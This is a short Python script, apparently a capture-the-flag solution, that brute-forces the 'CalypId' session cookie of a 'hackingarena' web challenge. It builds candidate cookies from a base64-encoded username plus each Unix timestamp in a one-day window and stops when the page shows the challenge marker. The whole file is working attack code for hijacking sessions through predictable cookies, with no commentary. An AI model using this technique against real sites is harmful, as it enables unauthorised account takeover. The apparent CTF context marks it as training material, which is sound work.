import requests
from datetime import datetime, timedelta


url = "http://koala.hackingarena.no:803/messages.php"

base64_username = "TWFybG93"

def generate_cookie(base64_username, timestamp):
    return f"{base64_username}{timestamp}"

def brute_force_cookie(start_timestamp, end_timestamp, url):
    session = requests.Session()

    for ts in range(start_timestamp, end_timestamp, -1): 
        cookie_value = generate_cookie(base64_username, ts)
        cookies = {"CalypId": cookie_value}
        response = session.get(url, cookies=cookies)
        if "Hacking-Arena" in response.text:
            print(f"Success! Cookie: {cookie_value}")
            print("Response:")
            print(response.text)
            break

if __name__ == "__main__":
    end_time = datetime(2024, 11, 13, 11, 44)
    end_timestamp = int(end_time.timestamp())

    start_time = datetime(2024, 11, 14, 11, 44)
    start_timestamp = int(start_time.timestamp())
    
    print(f"Trying timestamps from {start_timestamp} to {end_timestamp}")
    brute_force_cookie(start_timestamp, end_timestamp, url)
